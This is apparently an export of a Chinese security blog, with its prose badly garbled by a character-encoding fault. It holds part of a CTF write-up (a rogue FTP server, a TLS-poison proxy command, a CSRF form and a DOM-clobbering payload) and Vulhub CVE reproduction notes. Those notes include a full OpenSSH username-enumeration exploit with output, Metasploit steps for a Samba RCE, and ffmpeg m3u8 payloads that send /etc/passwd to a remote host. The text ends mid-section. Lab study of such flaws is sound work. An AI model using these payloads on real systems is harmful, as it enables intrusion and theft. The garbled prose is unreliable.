self.rfile.readline().strip().decode()\n        # # assert 'SIZE refs' == self.data, self.data\n        # self.finish()\n        # print(10,self.data, file=sys.stderr)\n        self.request.sendall(b'213 7\\r\\n')\n        self.data = self.rfile.readline().strip().decode()\n        print(self.data, file=sys.stderr)\n        self.request.sendall(b'125 Data connection already open. Transfer starting.\\r\\n')\n        self.data = self.rfile.readline().strip().decode()\n        print(self.data, file=sys.stderr)\n        self.request.sendall(b'250 Requested file action okay, completed.')\n        print(\"DIE.....\")\n        # exit()\n\n\nprint(\"ä½¿ç”¨ç«¯å£:\",sys.argv[1])\n\nwith socketserver.TCPServer(('0.0.0.0', int(sys.argv[1])), MyTCPHandler) as server:\n    while True:\n        print(\"start...\")\n        server.handle_request()\n        open(\"stop\", \"w\").write(\"OK\")\n        print(\"END....\")\n        # exit()\n```\n\né¦–å…ˆå¯åŠ¨TLSçš„ä»£ç†æœåŠ¡å™¨ï¼Œä½¿ç”¨[å·¥å…·](https://github.com/ZeddYu/TLS-poison/)è®¾ç½®å¥½äº†ä¹‹åï¼Œå¯¼å…¥è¯ä¹¦ç§é’¥é€šè¿‡ä¸€ä¸‹å‘½ä»¤æ‰“å¼€ä»£ç†\n\n```\nTLS-poison/client-hello-poisoning/custom-tls/target/debug/custom-tls -p 11211 --certs /home/ubuntu/tls/fullchain.pem --key /home/ubuntu/tls/privkey.pem forward 2048\n```\n\næ­¤æ—¶æˆ‘ä»¬å‘å¾€11211ç«¯å£çš„å¸¦TLSçš„è¯·æ±‚å°±ä¼šè¢«è§£å¯†å¹¶è½¬å‘åˆ°2048ç«¯å£ï¼Œç”±äºè¿™ä¸ªå·¥å…·é€šè¿‡è¯»å–redisä¸­çš„payloadæ¥ä¼ è¾“æ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆå°†payloadå­˜å…¥redisï¼Œç„¶åè®©å—å®³è€…å¯¹æˆ‘ä»¬æœåŠ¡å™¨çš„11211ç«¯å£å‘èµ·FTPSè¯·æ±‚ï¼Œæ­¤æ—¶æˆ‘ä»¬ä¼ªé€ çš„æœåŠ¡å™¨ä¼šè®©å—å®³è€…çš„æœåŠ¡å™¨åˆ°127.0.0.1:11200å»è·å–ftpä¼ è¾“çš„æ•°æ®ï¼Œè¿›è¡ŒTLSå¤ç”¨ï¼Œæ•°æ®è¢«æ³¨å…¥\n\n~~åé¢å°±æ˜¯èµ›åå¤ç›˜çš„äº†~~\n\n## beWhatYouWannaBe\n\né¦–å…ˆP1é€šè¿‡CSRFè·å–adminï¼Œå¹¶ä¸”æ­¤å¤„çš„Tokenå€¼å¯è®¡ç®—\n\n```javascript\nconst ValidateToken = (Token) => {\n    var sha256 = crypto.createHash('sha256');\n    return sha256.update(Math.sin(Math.floor(Date.now() / 1000)).toString()).digest('hex') === Token;\n}\napp.post('/beAdmin', (req, res) => {\n    if (req.session.user != 'admin') {\n        res.send(\"sorry, only admin can be admin\")\n        return\n    }\n    const username = req.body.username\n    const csrftoken = req.body.csrftoken\n    if (ValidateToken(csrftoken)) {\n        User.updateMany({ username: username }, { isAdmin: true },\n            (err, users) => {\n                if (err) {\n                    res.send('something error when being admin')\n                    return\n                }\n                if (users.length == 0) {\n                    res.send('no one can be admin')\n                } else {\n                    res.send('wow success wow')\n                }\n            }\n        )\n    } else {\n        res.send('validate error')3\n    }\n})\n```\n\nè·å–P1çš„jsæ„é€ å¦‚ä¸‹\n\n```html\n<form id=\"form\" action=\"http://localhost:8000/beAdmin\" method=\"post\"> \nÂ  Â \t<input name=\"username\" value=\"J1an\">\nÂ  Â \t<input id=\"csrftoken\" name=\"csrftoken\" value=\"\"> \n</form>\n<script src=\"https://cdn.jsdelivr.net/npm/crypto-js@4.0.0/crypto-js.js\"></script>\n<script>\n  \tvar a=CryptoJS.SHA256(Math.sin(Math.floor(Date.now() / 1000)).toString()).toString();\n \t\tcsrftoken.value=a;\n  \tform.submit();\n</script>\n```\n\nå†æ¥çœ‹P2\n\n```javascript\nawait page.setJavaScriptEnabled(false)\nawait page.goto(url, { timeout: 5000 })\nconst data = await page.evaluate((url, FLAG) => {\n    if (fff.lll.aaa.ggg.value == \"this_is_what_i_want\") {\n        return fetch(url + '?part2=' + btoa(encodeURIComponent(FLAG.substring(16))));\n    } else {\n        return fetch(url + '?there_is_no_flag')\n    }\n}, url, FLAG)\n```\n\nè¯´ç™½äº†å°±æ˜¯æ„é€ ä¸€ä¸ªhtmlä½¿å¾—`fff.lll.aaa.ggg.value == \"this_is_what_i_want\"`ï¼Œä½¿ç”¨[è¿™ä¸ª](https://portswigger.net/research/dom-clobbering-strikes-back)å°trickæ¥åµŒå¥—æ„é€ å…ƒç´ ï¼Œæœ€ç»ˆä¸¤è€…æ‹¼æ¥æ„é€ å‡ºçš„htmlå¦‚ä¸‹\n\n```html\n<html>\n<body>\n    <iframe name=fff srcdoc=\"<form id=lll name=aaa><input name=ggg value=this_is_what_i_want></form><form id=lll></form>\">\n    <form id=\"form\" action=\"http://localhost:8000/beAdmin\" method=\"post\"> \nÂ  Â \t<input name=\"username\" value=\"J1an\">\nÂ  Â \t<input id=\"csrftoken\" name=\"csrftoken\" value=\"\"> \n</form>\n<script src=\"https://cdn.jsdelivr.net/npm/crypto-js@4.0.0/crypto-js.js\"></script>\n<script>\n  \tvar a=CryptoJS.SHA256(Math.sin(Math.floor(Date.now() / 1000)).toString()).toString();\n \t\tcsrftoken.value=a;\n  \tform.submit();\n</script>\n</body>\n</html>\n```\n\n## poorui\n\nåŸºæœ¬å…¨æ˜¯éé¢„æœŸå§ï¼Œç™»å½•flagå»æ‰¾flagbotè¦å°±è¡Œäº†ss\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"JavaScriptä¸Nodejs","url":"/posts/8f3824ff.html","content":"\nä»å¤´å¼€å§‹äº†å±äºæ˜¯\n\n**å˜é‡å£°æ˜**\n\n```javascript\nvar x=1;\nconsole.log(x);\n```\n\nforå¾ªç¯ä¸ifåˆ¤æ–­ä¸C++æ ¼å¼ç›¸åŒ\n\n**å¯¹è±¡**\n\n**BOM**\n\n- æµè§ˆå™¨å¯¹è±¡æ¨¡å‹\n- javascriptå°†æµè§ˆå™¨çš„å„ä¸ªç»„æˆéƒ¨åˆ†å°è£…æˆå¯¹è±¡\n  - Windowï¼šæµè§ˆå™¨çª—å£å¯¹è±¡\n  - Navigatorï¼šæµè§ˆå™¨å¯¹è±¡\n  - Screenï¼šå±å¹•å¯¹è±¡\n  - Historyï¼šå†å²è®°å½•å¯¹è±¡\n    - history.back()åé€€\n    - history.forward()å‰è¿›\n  - Locationï¼šåœ°å€æ å¯¹è±¡\n    - location.href()è®¾ç½®æˆ–è¿”å›å®Œæ•´URL\n\n**DOM**\n\n- æ–‡æ¡£å¯¹è±¡æ¨¡å‹\n- å°†æ ‡è®°è¯­è¨€çš„å„ä¸ªéƒ¨åˆ†å°è£…æˆå¯¹è±¡\n  - Documentï¼šæ•´ä¸ªæ–‡æ¡£å¯¹è±¡\n  - Elementï¼šå…ƒç´ å¯¹è±¡\n  - Attributeï¼šå±æ€§å¯¹è±¡\n  - Textï¼šæ–‡æœ¬å¯¹è±¡\n  - Commentï¼šæ³¨é‡Šå¯¹è±¡\n  - \n"},{"title":"CVE","url":"/posts/67caa546.html","content":"\n# CVE\n\nåœ¨Vulhubä¸Šé¢çš„CVEå¤ç°ï¼Œä¸€ä»½å°è®°å½•\n\n## OpenSSH\n\n### CVE-2018-15473\n\næ¼æ´å†…å®¹ï¼šåœ¨OpenSSH 7.7å‰å­˜åœ¨ä¸€ä¸ªç”¨æˆ·åæšä¸¾æ¼æ´ï¼Œé€šè¿‡è¯¥æ¼æ´ï¼Œå¯ä»¥åˆ¤æ–­æŸä¸ªç”¨æˆ·åæ˜¯å¦å­˜åœ¨äºç›®æ ‡ä¸»æœºä¸­\n\næ¼æ´ä½œç”¨ï¼šæˆ‘ä»¬ç”¨å¼±å£ä»¤ã€çˆ†ç ´ç­‰æ–¹å¼è¿›è¡Œå°è¯•ç™»å½•æ—¶ï¼Œsshéœ€è¦çš„ç”¨æˆ·åå’Œè´¦æˆ·åä¸ç®¡æ˜¯ä¸€è‡´è¿˜æ˜¯ä¸ä¸€è‡´ï¼Œéƒ½ä¼šç»™æˆ‘ä»¬ä¸€ä¸ªç™»å½•å»¶è¿Ÿçš„å‡è±¡ï¼Œè®©æˆ‘ä»¬ä»¥ä¸ºå¯ä»¥ç™»å½•æˆåŠŸï¼Œå®åˆ™ä¸ç®¡ä½ çš„ç”¨æˆ·åæ˜¯å¦æ˜¯æ­£ç¡®çš„ï¼Œå®ƒéƒ½ä¼šè®©ä½ è¾“å…¥å¯†ç ï¼Œç„¶åå‘Šè¯‰ä½ ç™»å½•å¤±è´¥ï¼Œå› æ­¤æˆ‘ä»¬å¿…é¡»çŸ¥é“å¯¹æ–¹ç”¨æˆ·å‡†ç¡®çš„ç”¨æˆ·åï¼Œè®©æˆ‘ä»¬åœ¨æ¥ä¸‹æ¥ä¸ç®¡æ˜¯å¼±å£ä»¤ç™»å½•è¿˜æ˜¯æš´åŠ›ç ´è§£æ–¹é¢éƒ½å¾ˆæœ‰å¸®åŠ©\n\nåˆ©ç”¨æ¡ä»¶ï¼šOpenSSH ç‰ˆæœ¬<7.7\n\næ¼æ´å¤ç°ï¼š\n\n1. è¿›å…¥dockeræ›´æ”¹å¯†ç ï¼Œæ­¤å¤„æ”¹ä¸º`123456`\n\n2. sshè¿æ¥dockerï¼ŒæŸ¥çœ‹`/etc/passwd`æ–‡ä»¶æ¥æŸ¥çœ‹ç”¨æˆ·å\n\n   ```\n   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n   bin:x:2:2:bin:/bin:/usr/sbin/nologin\n   sys:x:3:3:sys:/dev:/usr/sbin/nologin\n   sync:x:4:65534:sync:/bin:/bin/sync\n   games:x:5:60:games:/usr/games:/usr/sbin/nologin\n   man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n   lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n   mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n   news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n   uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n   proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n   www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n   backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n   list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n   irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\n   gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n   nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n   _apt:x:100:65534::/nonexistent:/bin/false\n   sshd:x:74:74:Privilege-separated SSH:/usr/local/sbin/sshd:/sbin/nologin\n   vulhub:x:1000:1000:,,,:/home/vulhub:/bin/bash\n   example:x:1001:1001:,,,:/home/example:/bin/bash\n   ```\n\n3. æµ‹è¯•exp\n\n   ```python\n   #!/usr/bin/env python\n   # python2 exp.py --port SSHç«¯å£ --userList ç”¨æˆ·åå­—å…¸ IP\n   ###########################################################################\n   #                ____                    _____ _____ _    _               #\n   #               / __ \\                  / ____/ ____| |  | |              #\n   #              | |  | |_ __   ___ _ __ | (___| (___ | |__| |              #\n   #              | |  | | '_ \\ / _ \\ '_ \\ \\___ \\\\___ \\|  __  |              #\n   #              | |__| | |_) |  __/ | | |____) |___) | |  | |              #\n   #               \\____/| .__/ \\___|_| |_|_____/_____/|_|  |_|              #\n   #                     | |               Username Enumeration              #\n   #                     |_|                                                 #\n   #                                                                         #\n   ###########################################################################\n   # Exploit: OpenSSH Username Enumeration Exploit (CVE-2018-15473)          #\n   # Vulnerability: CVE-2018-15473                                           #\n   # Affected Versions: OpenSSH version < 7.7                                #\n   # Author: Justin Gardner, Penetration Tester @ SynerComm AssureIT         #\n   # Github: https://github.com/Rhynorater/CVE-2018-15473-Exploit            #\n   # Email: Justin.Gardner@SynerComm.com                                     #\n   # Date: August 20, 2018                                                   #\n   ###########################################################################\n   \n   import argparse\n   import logging\n   import paramiko\n   import multiprocessing\n   import socket\n   import string\n   import sys\n   import json\n   from random import randint as rand\n   from random import choice as choice\n   # store function we will overwrite to malform the packet\n   old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]\n   \n   # list to store 3 random usernames (all ascii_lowercase characters); this extra step is added to check the target\n   # with these 3 random usernames (there is an almost 0 possibility that they can be real ones)\n   random_username_list = []\n   # populate the list\n   for i in range(3):\n       user = \"\".join(choice(string.ascii_lowercase) for x in range(rand(15, 20)))\n       random_username_list.append(user)\n   \n   # create custom exception\n   class BadUsername(Exception):\n       def __init__(self):\n           pass\n   \n   # create malicious \"add_boolean\" function to malform packet\n   def add_boolean(*args, **kwargs):\n       pass\n   \n   # create function to call when username was invalid\n   def call_error(*args, **kwargs):\n       raise BadUsername()\n   \n   # create the malicious function to overwrite MSG_SERVICE_ACCEPT handler\n   def malform_packet(*args, **kwargs):\n       old_add_boolean = paramiko.message.Message.add_boolean\n       paramiko.message.Message.add_boolean = add_boolean\n       result  = old_parse_service_accept(*args, **kwargs)\n       #return old add_boolean function so start_client will work again\n       paramiko.message.Message.add_boolean = old_add_boolean\n       return result\n   \n   # create function to perform authentication with malformed packet and desired username\n   def checkUsername(username, tried=0):\n       sock = socket.socket()\n       sock.connect((args.hostname, args.port))\n       # instantiate transport\n       transport = paramiko.transport.Transport(sock)\n       try:\n           transport.start_client()\n       except paramiko.ssh_exception.SSHException:\n           # server was likely flooded, retry up to 3 times\n           transport.close()\n           if tried < 4:\n               tried += 1\n               return checkUsername(username, tried)\n           else:\n               print('[-] Failed to negotiate SSH transport')\n       try:\n           transport.auth_publickey(username, paramiko.RSAKey.generate(1024))\n       except BadUsername:\n               return (username, False)\n       except paramiko.ssh_exception.AuthenticationException:\n               return (username, True)\n       #Successful auth(?)\n       raise Exception(\"There was an error. Is this the correct version of OpenSSH?\")\n   \n   # function to test target system using the randomly generated usernames\n   def checkVulnerable():\n       vulnerable = True\n       for user in random_username_list:\n           result = checkUsername(user)\n           if result[1]:\n               vulnerable = False\n       return vulnerable\n   \n   def exportJSON(results):\n       data = {\"Valid\":[], \"Invalid\":[]}\n       for result in results:\n           if result[1] and result[0] not in data['Valid']:\n               data['Valid'].append(result[0])\n           elif not result[1] and result[0] not in data['Invalid']:\n               data['Invalid'].append(result[0])\n       return json.dumps(data)\n   \n   def exportCSV(results):\n       final = \"Username, Valid\\n\"\n       for result in results:\n           final += result[0]+\", \"+str(result[1])+\"\\n\"\n       return final\n   \n   def exportList(results):\n       final = \"\"\n       for result in results:\n           if result[1]:\n               final+=result[0]+\" is a valid user!\\n\"\n           else:\n               final+=result[0]+\" is not a valid user!\\n\"\n       return final\n   \n   # assign functions to respective handlers\n   paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet\n   paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error\n   \n   # get rid of paramiko logging\n   logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())\n   \n   arg_parser = argparse.ArgumentParser()\n   arg_parser.add_argument('hostname', type=str, help=\"The target hostname or ip address\")\n   arg_parser.add_argument('--port', type=int, default=22, help=\"The target port\")\n   arg_parser.add_argument('--threads', type=int, default=5, help=\"The number of threads to be used\")\n   arg_parser.add_argument('--outputFile', type=str, help=\"The output file location\")\n   arg_parser.add_argument('--outputFormat', choices=['list', 'json', 'csv'], default='list', type=str, help=\"The output file location\")\n   group = arg_parser.add_mutually_exclusive_group(required=True)\n   group.add_argument('--username', type=str, help=\"The single username to validate\")\n   group.add_argument('--userList', type=str, help=\"The list of usernames (one per line) to enumerate through\")\n   args = arg_parser.parse_args()\n   \n   def main():\n       sock = socket.socket()\n       try:\n           sock.connect((args.hostname, args.port))\n           sock.close()\n       except socket.error:\n           print('[-] Connecting to host failed. Please check the specified host and port.')\n           sys.exit(1)\n   \n       # first we run the function to check if host is vulnerable to this CVE\n       if not checkVulnerable():\n           # most probably the target host is either patched or running a version not affected by this CVE\n           print(\"Target host most probably is not vulnerable or already patched, exiting...\")\n           sys.exit(0)\n       elif args.username: #single username passed in\n           result = checkUsername(args.username)\n           if result[1]:\n               print(result[0]+\" is a valid user!\")\n           else:\n               print(result[0]+\" is not a valid user!\")\n       elif args.userList: #username list passed in\n           try:\n               f = open(args.userList)\n           except IOError:\n               print(\"[-] File doesn't exist or is unreadable.\")\n               sys.exit(3)\n           usernames = map(str.strip, f.readlines())\n           f.close()\n           # map usernames to their respective threads\n           pool = multiprocessing.Pool(args.threads)\n           results = pool.map(checkUsername, usernames)\n           try:\n               if args.outputFile:\n                   outputFile = open(args.outputFile, \"w\")\n           except IOError:\n               print(\"[-] Cannot write to outputFile.\")\n               sys.exit(5)\n           if args.outputFormat=='json':\n               if args.outputFile:\n                   outputFile.writelines(exportJSON(results))\n                   outputFile.close()\n                   print(\"[+] Results successfully written to \" + args.outputFile + \" in JSON form.\")\n               else:\n                   print(exportJSON(results))\n           elif args.outputFormat=='csv':\n               if args.outputFile:\n                   outputFile.writelines(exportCSV(results))\n                   outputFile.close()\n                   print(\"[+] Results successfully written to \" + args.outputFile + \" in CSV form.\")\n               else:\n                   print(exportCSV(results))\n           else:\n               if args.outputFile:\n                   outputFile.writelines(exportList(results))\n                   outputFile.close()\n                   print(\"[+] Results successfully written to \" + args.outputFile + \" in List form.\")\n               else:\n                   print(exportList(results))\n       else: # no usernames passed in\n           print(\"[-] No usernames provided to check\")\n           sys.exit(4)\n   \n   if __name__ == '__main__':\n       main()\n   ```\n\n   æ­¤å¤„æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªç”¨æˆ·åå­—å…¸ï¼Œå¯ä»¥è‡ªè¡Œæ„é€ ï¼Œä¹Ÿå¯ä»¥ç”¨githubä¸Šé¢ä¸€ä¸ªå¼€æºé¡¹ç›®[SecLists](https://github.com/danielmiessler/SecLists/)ï¼ŒèŠ‚çº¦æ—¶é—´æˆ‘ä»¬è‡ªè¡Œæ„é€ ä¸€ä¸ªç®€çŸ­listï¼Œæœ€ç»ˆæµ‹è¯•ç»“æœå¦‚ä¸‹\n\n   ```\n   admin is not a valid user!\n   bin is a valid user!\n   sys is a valid user!\n   sync is a valid user!\n   games is a valid user!\n   man is a valid user!\n   lp is a valid user!\n   111 is not a valid user!\n   1243 is not a valid user!\n   sahdsa is not a valid user!\n   jalba is not a valid user!\n   dsa is not a valid user!\n   fe is not a valid user!\n   qf is not a valid user!\n   ds is not a valid user!\n   vc is not a valid user!\n   dsshg is not a valid user!\n   rsa is not a valid user!\n   grdfsbvfgd is not a valid user!\n   sb is not a valid user!\n   fgd is not a valid user!\n   s is not a valid user!\n   bgfd is not a valid user!\n   s is not a valid user!\n   g is not a valid user!\n   fds is not a valid user!\n   g is not a valid user!\n   fd is not a valid user!\n   sgf is not a valid user!\n   ds is not a valid user!\n   g is not a valid user!\n   fdsh is not a valid user!\n   tr is not a valid user!\n   wnbyrsbf is not a valid user!\n   dgs is not a valid user!\n   root is a valid user!\n   ```\n\n   æ˜¾ç„¶æ¼æ´å­˜åœ¨ï¼Œè€Œå½“æˆ‘ä»¬å¯¹é«˜çº§ç‰ˆæœ¬çš„SSHè¿›è¡Œæµ‹è¯•æ—¶ï¼Œexpå¤±æ•ˆ\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206171757123.png)\n\n## Sambaï¼ˆSMBï¼‰\n\n### CVE-2017-7494\n\næ¼æ´å†…å®¹ï¼šåªéœ€è¦æœ‰ä¸€ä¸ªå¯ä»¥å†™å…¥æ–‡ä»¶çš„ç”¨æˆ·å°±å¯ä»¥ææƒåˆ°rootæƒé™\n\næ¼æ´ä½œç”¨ï¼šRCE\n\nå½±å“èŒƒå›´ï¼šSamba 3.5.0 ä¹‹ååˆ°4.6.4/4.5.10/4.4.14ä¸­é—´çš„æ‰€æœ‰ç‰ˆæœ¬\n\næ¼æ´å¤ç°ï¼š\n\n1. vulhubç›´æ¥èµ·ä¸€ä¸ªdocker\n\n2. ä½¿ç”¨msfæœç´¢å¯¹åº”æ¼æ´`search is_known_pipename`\n\n3. ä½¿ç”¨setå‘½ä»¤è®¾ç½®rhost\n\n4. å¦‚æœå¯¹æ–¹æœåŠ¡å¼€å¯äº†åŒ¿åç™»å½•ç›´æ¥ä½¿ç”¨runå‘½ä»¤å³å¯ï¼Œå¦‚æœå·²çŸ¥ç”¨æˆ·åå¯†ç å¯ä½¿ç”¨set smbuserå’Œsmbpassæ¥æŒ‡å®šç”¨æˆ·ç™»å½•\n\n5. æˆåŠŸæ‹¿shell\n\n   ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208101616840.png)\n\n## ffmpeg\n\n### CVE-2016-1897\n\næ¼æ´å†…å®¹ï¼šé¦–å…ˆäº†è§£ä¸€ä¸‹m3u8æ–‡ä»¶æ ¼å¼ï¼Œm3u8æ˜¯ä¸€ç§ç´¢å¼•æ–‡ä»¶ï¼Œç”¨äºHLSåè®®ä¼ è¾“åª’ä½“æµï¼Œm3u8ç´¢å¼•æŒ‡å‘ä¸€ä¸ªä¸ªå°çš„åª’ä½“æµç¢ç‰‡\n\n> ç®€è€Œè¨€ä¹‹ï¼Œ[HLS](https://links.jianshu.com/go?to=https%3A%2F%2Fzh.wikipedia.org%2Fwiki%2FHTTP_Live_Streaming) æ˜¯æ–°ä¸€ä»£æµåª’ä½“ä¼ è¾“åè®®ï¼Œå…¶åŸºæœ¬å®ç°åŸç†ä¸ºå°†ä¸€ä¸ªå¤§çš„åª’ä½“æ–‡ä»¶è¿›è¡Œåˆ†ç‰‡ï¼Œå°†è¯¥åˆ†ç‰‡æ–‡ä»¶èµ„æºè·¯å¾„è®°å½•äº m3u8 æ–‡ä»¶ï¼ˆå³ playlistï¼‰å†…ï¼Œå…¶ä¸­é™„å¸¦ä¸€äº›é¢å¤–æè¿°ï¼ˆæ¯”å¦‚è¯¥èµ„æºçš„å¤šå¸¦å®½ä¿¡æ¯Â·Â·Â·ï¼‰ç”¨äºæä¾›ç»™å®¢æˆ·ç«¯ã€‚å®¢æˆ·ç«¯ä¾æ®è¯¥ m3u8 æ–‡ä»¶å³å¯è·å–å¯¹åº”çš„åª’ä½“èµ„æºï¼Œè¿›è¡Œæ’­æ”¾ã€‚\n\nä¸€ä¸ªåŸºæœ¬çš„m3u8æ–‡ä»¶æ ¼å¼å¦‚ä¸‹\n\n> - m3u8 æ–‡ä»¶å¿…é¡»ä»¥ utf-8 è¿›è¡Œç¼–ç ï¼Œä¸èƒ½ä½¿ç”¨ Byte Order Markï¼ˆBOMï¼‰å­—èŠ‚åºï¼Œ ä¸èƒ½åŒ…å« utf-8 æ§åˆ¶å­—ç¬¦ï¼ˆU+0000 ~ U_001F å’Œ U+007F ~ u+009Fï¼‰ã€‚\n>\n> - m3u8 æ–‡ä»¶çš„æ¯ä¸€è¡Œè¦ä¹ˆæ˜¯ä¸€ä¸ª URIï¼Œè¦ä¹ˆæ˜¯ç©ºè¡Œï¼Œè¦ä¹ˆå°±æ˜¯ä»¥ **#** å¼€å¤´çš„å­—ç¬¦ä¸²ã€‚ä¸èƒ½å‡ºç°ç©ºç™½å­—ç¬¦ï¼Œé™¤äº†æ˜¾ç¤ºå£°æ˜çš„å…ƒç´ ã€‚\n>\n> - m3u8 æ–‡ä»¶ä¸­ä»¥ **#** å¼€å¤´çš„å­—ç¬¦ä¸²è¦ä¹ˆæ˜¯æ³¨é‡Šï¼Œè¦ä¹ˆå°±æ˜¯æ ‡ç­¾ã€‚æ ‡ç­¾ä»¥ **#EXT** å¼€å¤´ï¼Œå¤§å°å†™æ•æ„Ÿã€‚\n>\n> - ```\n>   å„å‚æ•°è¯´æ˜ï¼š \n>   #EXTM3U æ ‡ç­¾æ˜¯ m3u8 çš„æ–‡ä»¶å¤´ï¼Œå¼€å¤´å¿…é¡»è¦è¿™ä¸€è¡Œ\n>   #EXT-X-MEDIA-SEQUENCE è¡¨ç¤ºæ¯ä¸€ä¸ªmedia URI åœ¨ PlayListä¸­åªæœ‰å”¯ä¸€çš„åºå·ï¼Œç›¸é‚»ä¹‹é—´åºå·+1\n>   #EXTINF:10.0, è¡¨ç¤ºè¯¥ä¸€æ®µ TS æµæ–‡ä»¶çš„é•¿åº¦\n>   #EXT-X-ENDLIST è¿™ä¸ªç›¸å½“äºæ–‡ä»¶ç»“æŸç¬¦\n>   ```\n\n```m3u8\n#EXTM3U\n#EXT-X-TARGETDURATION:10\n#EXTINF:9.009,\nhttp://media.example.com/first.ts\n#EXTINF:9.009,\nhttp://media.example.com/second.ts\n#EXTINF:3.003,\nhttp://media.example.com/third.ts\n#EXT-X-ENDLIST\n```\n\nè€Œåœ¨ffmpegç‰¹å®šç‰ˆæœ¬ä¸­å¹¶æ²¡æœ‰å¯¹URIè¿›è¡Œä»»ä½•æ£€æŸ¥ï¼Œæ­¤å¤„å¯å¯¼è‡´SSRFï¼Œåªéœ€è¦ç›‘å¬ä¸€ä¸ªç«¯å£ç„¶åç›´æ¥è®¿é—®å³å¯éªŒè¯\n\nä»»æ„æ–‡ä»¶è¯»å–æˆå› æ˜¯åœ¨ffmpegä¸­æœ‰concatå‡½æ•°å¯ä»¥å¯¹URIè¿›è¡Œæ‹¼æ¥ï¼Œæˆ‘ä»¬åªè¦å°†æ–‡ä»¶ä½œä¸ºhttpè¯·æ±‚çš„å‚æ•°å³å¯å¸¦å‡ºï¼Œä½†ç›´æ¥ä½¿ç”¨concatå¹¶ä¸ä¼šå¯¹æ–‡ä»¶è¯·æ±‚è®¿é—®ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå°æŠ€å·§ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡ä¸»m3u8è®¿é—®æ¬¡çº§m3u8æ¥ä½¿å¾—æ–‡ä»¶è¢«è¯»å–\n\nkkk.txt\n\n```\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nconcat:http://xxx/test.txt|file:///etc/passwd\n#EXT-X-ENDLIST\n```\n\ntext.txt\n\n```\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:,\nhttp://xxx/?\n```\n\nxxx.m3u8\n\n```\n#EXTM3U\n#EXT-X-TARGETDURATION:6\n#EXTINF:10.0,\nconcat:http://xxx/kkk.txt\n#EXT-X-ENDLIST\n```\n\nå°†kkk.txtå’Œtext.txtéƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç„¶åç”¨ffmpegå¤„ç†xxx.m3u8æ–‡ä»¶å³å¯å¸¦å‡ºpasswdæ–‡ä»¶é¦–è¡Œ\n\n## Git\n\n### CVE-2017-8386\n\næ¼æ´æˆå› ï¼š\n\n- å½“æˆ‘ä»¬æƒ³ä»githubå…‹éš†ä¸€ä»½ä»£ç ä¸‹æ¥çš„æ—¶å€™ï¼Œä¼šæœ‰sshå…‹éš†çš„é€‰é¡¹ï¼Œæˆ‘ä»¬å»éšä¾¿æä¸€ä¸ªåœ°å€ï¼Œæ‰¾åˆ°Clone with SSHé‡Œåˆ—å‡ºçš„åœ°å€ï¼š`git@github.com:Jlan45/j1an.github.io.git`å…¶å®å°±æ˜¯é€šè¿‡sshåè®®è¿æ¥githubä½¿ç”¨gitç”¨æˆ·å°†è¿™ä¸ªæ–‡ä»¶æä¸‹æ¥\n\n- é‚£æˆ‘ä»¬çŒœæƒ³ä¸€ä¸‹ï¼Œæ˜¯ä¸æ˜¯ç›´æ¥sshé“¾æ¥å°±èƒ½å’Œæˆ‘ä»¬é“¾æ¥ä¸€ä¸ªæœåŠ¡å™¨ä¸€æ ·å»æ‰§è¡Œå‘½ä»¤å‘¢\n\n- æµ‹è¯•å‘ç°æˆ‘ä»¬ç¡®å®è¿æ¥ä¸Šäº†æœåŠ¡å™¨ï¼Œä½†æ˜¯æœåŠ¡å™¨ç»™æˆ‘ä»¬å¼¹äº†ä¸€å¥è¯å°±è®©æˆ‘ä»¬å¼ºåˆ¶é€€å‡ºäº†\n\n- è¿™æ˜¯æ€ä¹ˆåšåˆ°çš„å’§\n\n- > é‚£ä¹ˆï¼Œgithubè¿™ç±»gitæœåŠ¡å•†æ˜¯æ€ä¹ˆå®ç°ä¸Šè¿°â€œå®‰å…¨â€é€šä¿¡çš„æµç¨‹çš„å‘¢ï¼Ÿ\n  >\n  > è®©ç”¨æˆ·å¯ä»¥é€šè¿‡sshè®¤è¯èº«ä»½ï¼Œä½†åˆä¸ç»™ç”¨æˆ·shellï¼Œè¿™ä¸ªè¿‡ç¨‹æœ‰ä¸¤ç§æ–¹æ³•å®ç°ï¼š\n  >\n  > åˆ›å»ºç³»ç»Ÿç”¨æˆ·gitçš„æ—¶å€™å°†å…¶shellè®¾ç½®æˆgit-shell\n  > åœ¨authorized_keysæ–‡ä»¶æ¯ä¸ªssh-keyçš„å‰é¢è®¾ç½®commandï¼Œè¦†ç›–æˆ–åŠ«æŒé‡å†™åŸæœ¬çš„å‘½ä»¤\n  > 